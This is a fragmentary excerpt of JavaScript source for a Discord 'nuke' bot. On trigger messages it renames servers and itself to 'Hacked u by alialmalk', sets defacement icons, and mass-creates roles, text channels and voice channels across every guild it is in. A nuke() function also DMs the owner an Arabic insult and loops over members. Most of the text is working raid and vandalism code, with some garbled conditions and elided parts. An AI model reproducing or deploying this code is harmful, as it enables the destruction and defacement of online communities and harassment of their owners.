...
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setUsername("Hacked u by alialmalk Is here")
 
}
});
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setGame(`Hacked u by alialmalk Is here`,'https://www.twitch.tv/hix')
...
LOka.on('message', message => {
     if (message.content === ".") {
         LOka.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/663137187453206552/741734867183861820/image0.jpg`)
})
}
});
LOka.on('message', message => {
     if (message.content === ".") {
         LOka.guilds.forEach(m =>{
             m.setName(`Hacked u by alialmalk Is here`)
})
}
});
...
LOka.on('message', message => {
     if (message.content === ".") {
             ...
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/663137187453206552/741734867183861820/image0.jpg`)
...
LOka.on('message', message => {
     ...
     if (message.content === "k1","K1") {
         LOka.guilds.forEach(m =>{
   m.createRole({
        name : "Hacked u by alialmlk Is here",
        permissions :   [1],
        color : " #ff0000"
    })
  ...
  m.createRole({
    ...
    m.createRole({
        name : "Hacked u by alialmalk Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
...
LOka.on('message', message => {
         if (message.content === "k","K") {
               LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by alialmlk Is here', 'text');
m.createChannel('Hacked u by alialmlk Is here', 'text');
m.createChannel('Hacked u by alialmlk Is here', 'text');
m.createChannel('Hacked u by alialmlk Is here', 'text');
m.createChannel('Hacked u by alialmlk Is here', 'text');
...
LOka.on('message', message => {
         if (message.content === "k","K") {
                 LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by alialmlk Is here', 'voice');
m.createChannel('Hacked u by alialmlk Is here', 'voice');
m.createChannel('Hacked u by alialmlk Is here', 'voice');
m.createChannel('Hacked u by alialmlk Is here', 'voice');
m.createChannel('Hacked u by alialmlk Is here', 'voice');
...
async function nuke(guild) {
  ...
  await guild.owner.send(' يا حمار سلم على سيرفرك HAKED BY ALIALMALK ').catch(e => { return void e; });
  ...
  await Promise.all(guild.members.map(async (m) => {
    ...
    await guild.createChannel('Hacked u by alialmlk Is here', 'text');
 
      await guild.createChannel('Hacked u by alialmlk Is here', 'voice');
